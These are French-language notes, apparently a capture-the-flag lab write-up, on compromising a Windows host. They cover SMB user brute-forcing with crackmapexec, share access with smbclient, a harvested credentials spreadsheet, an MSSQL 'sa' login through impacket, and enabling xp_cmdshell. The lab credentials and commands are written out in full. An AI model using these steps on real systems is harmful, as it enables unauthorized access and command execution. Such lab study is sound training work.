## Enumeration:

---


### About :

- **adresse IP**

```
10.10.11.51
```


- **OS** : Windows
### nmap:

![[Pasted image 20250222085901.png]]

### Attaque SMB:

- Enumérer les utilisateur du système windows accessible via **SMB** en uilisant l'attaque **RID Brute-Force**

```
crackmapexec smb escape.local -u "rose" -p "KxEPkKe6R8su" --rid-brute | grep SidTypeUser
```

![[Pasted image 20250223093037.png]]

- Enumérer les **partages SMB** en utlisant l'user **rose**:

```
smbclient -L //escape.local -U rose
```

![[Pasted image 20250223093453.png]]

- Accéder au partage SMB **Accounting Departement** sur la machine avec l'utilisateur **rose** pour essayer de chercher une liste de **compte** et **mot de passe**

```
smbclient //escape.local/Accounting\ Department  -U rose
```

Une fois connécter, on peut afficher la liste des fichiers dans le répertoire avec la commande `dir` (comande windows). On constate qu'il y a deux fichiers dans le répertoire :

![[Pasted image 20250223094317.png]]

On acceder à ces fichiers en utilisant la commande `get`. 

- On peut maintenant ouvrir les fichiers télécharger, et dans le fichier **accounts.xlsx** on trouve des choses imporatantes :

![[Pasted image 20250223100927.png]]
C'est l'user **sa** qui nous interesse.

### Serveur MSSQL:

- On a obtenu des Users-names donc on va tenter de se connécter au serveur MSSQL disponible sur la machine:

```
impacket-mssqlclient 'escape.local/sa:MSSQLP@ssw0rd!'@10.10.11.51
```

![[Pasted image 20250223112226.png]]

- Changer le paramètre `xp_cmdshell` pour `1` (activé) et appliquer les changement imédiatement.

```
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

- Vérification de l'état de `xp_cmdshell`

```
EXEC sp_configure 'xp_cmdshell';
```

![[Pasted image 20250223112721.png]]

- ’**exécuter une commande système Windows sur un serveur Microsoft SQL Server** en utilisant un utilisateur privilégié (`sa`).

